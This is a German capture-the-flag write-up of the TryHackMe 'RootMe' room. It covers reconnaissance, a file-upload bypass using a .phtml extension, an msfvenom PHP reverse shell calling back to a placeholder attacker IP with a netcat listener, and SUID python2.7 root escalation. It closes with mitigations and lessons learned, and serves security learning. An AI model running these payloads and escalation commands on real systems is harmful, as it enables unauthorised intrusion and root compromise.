# TryHackMe — RootMe

| | |
|---|---|
| **Room** | [RootMe](https://tryhackme.com/room/rrootme) |
| **Kategorie** | Web Exploitation / Linux Privilege Escalation |
| **Schwierigkeit** | Easy |
| **Tools** | Nmap, Gobuster, msfvenom, Netcat |

> ⚠️ **Disclaimer:** Dieses Write-up wurde ausschließlich in einer isolierten, legalen Lab-Umgebung (TryHackMe) erstellt und dient Lern- und Demonstrationszwecken. Es werden keine Flags im Klartext veröffentlicht — der Fokus liegt auf Methodik, Tools und Absicherung, nicht auf der reinen Lösung.

## Zusammenfassung

Die Maschine exponiert einen Webserver mit einem ungesicherten Datei-Upload, der über eine Umgehung der Dateiendungs-Validierung zu Remote Code Execution führt. Die anschließende Rechteausweitung basiert auf einer fehlkonfigurierten SUID-Bit-Berechtigung auf einem Python-Interpreter.

---

## 1. Reconnaissance (Aufklärung)

### Port-Scan

```bash
nmap -sC -sV -p- <IP>
```

```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
```

**Befund:** Zwei offene Ports (SSH, HTTP). Der HTTP-Header gibt die Apache-Version preis (`2.4.41`), zudem fehlt das `httponly`-Flag auf dem `PHPSESSID`-Cookie, ein erstes Indiz für unzureichendes Session-Hardening.

### Verzeichnis-Enumeration
#### Suche nach versteckten Verzeichnissen mit Gobuster.


```bash
gobuster dir -u http://<IP>:80 -w /usr/share/wordlists/dirb/big.txt -x txt,log,bak,old
```

```text
/panel      (Status: 301)
/uploads    (Status: 301)
```

**Befund:** Ein offen erreichbares `/uploads`-Verzeichnis deutet auf eine Upload-Funktionalität hin,  der naheliegendste Angriffsvektor für den nächsten Schritt.

---

## 2. Exploitation (Einbruch)

### Schwachstelle: Unzureichende Validierung von Datei-Uploads

Die Anwendung filtert Uploads offenbar nur anhand der Dateiendung (Blacklist statt Whitelist). Eine Payload mit der Endung `.php` wurde abgelehnt, eine identische Payload mit der Endung `.phtml` die von Apache standardmäßig ebenfalls als PHP interpretiert wird jedoch akzeptiert.

**Payload-Erstellung:**

```bash
msfvenom -p php/reverse_php LHOST=<ATTACKER_IP> LPORT=9001 -o shell.phtml
```
#### Pyload wurde mithilfe von [REVSHELLS](http://revshells.com/) erstellt. 

**Listener:**

```bash
nc -lvnp 9001
```

**Ausführung:** Aufruf der hochgeladenen Datei unter `http://<IP>/uploads/shell.phtml` im Browser löst die Reverse Shell aus.

**Ergebnis:** Erfolgreicher Zugriff als Webserver-Benutzer, bestätigt über `pwd` (`/var/www/html/uploads`). Im übergeordneten Verzeichnis liegt die User-Flag.

---

## 3. Privilege Escalation (Eskalation)

### Suche nach SUID-Binaries

```bash
find / -user root -perm /4000 2>/dev/null
```

**Befund:** `/usr/bin/python2.7` besitzt das SUID-Bit mit Owner `root` eine kritische Fehlkonfiguration, da der Python-Interpreter beliebigen Code mit den Rechten des Dateieigentümers ausführen kann.

### Rechteausweitung mithilfe GTFOBins

Nach Abgleich mit [GTFOBins](https://gtfobins.org/) wurde die SUID-Eigenschaft wie folgt ausgenutzt:

```bash
/usr/bin/python2.7 -c 'import os; os.setuid(0); print(os.popen("cat /root/root.txt").read()'
```

Damit wird eine Shell mit effektiver UID 0 (root) gestartet, über die `/root/root.txt` gelesen werden kann.

---

## 4. Mitigations

| Befund | Empfehlung |
|---|---|
| Upload-Filter nur per Dateiendungs-Blacklist | Server-seitige Whitelist zulässiger Endungen **und** Validierung des tatsächlichen Dateiinhalts (MIME-Type/Magic Bytes); hochgeladene Dateien außerhalb der Webroot oder ohne Ausführungsrecht ablegen |
| SUID-Bit auf `/usr/bin/python2.7` | SUID-Bit von Interpretern/Skriptsprachen grundsätzlich entfernen (`chmod u-s`); SUID nur auf geprüfte, minimal scope­te Binaries beschränken |
| `PHPSESSID`-Cookie ohne `HttpOnly` | Session-Cookies serverseitig mit `HttpOnly` (und `Secure`, `SameSite`) setzen, um Zugriff durch clientseitiges JavaScript zu verhindern |
| Apache-Version im Response-Header sichtbar | `ServerTokens Prod` / `ServerSignature Off` setzen, um Versions-Fingerprinting zu erschweren |

---

## Lessons Learned

- Dateiendungs-Blacklists sind unzuverlässig, solange der Webserver alternative, ausführbare Endungen (`.phtml`, `.php5` etc.) akzeptiert.
- SUID-Bits auf Interpretern sind ein häufiger und leicht zu übersehender Eskalationspfad — `find / -perm -u=s` sollte fester Bestandteil jeder Post-Exploitation-Checkliste sein.
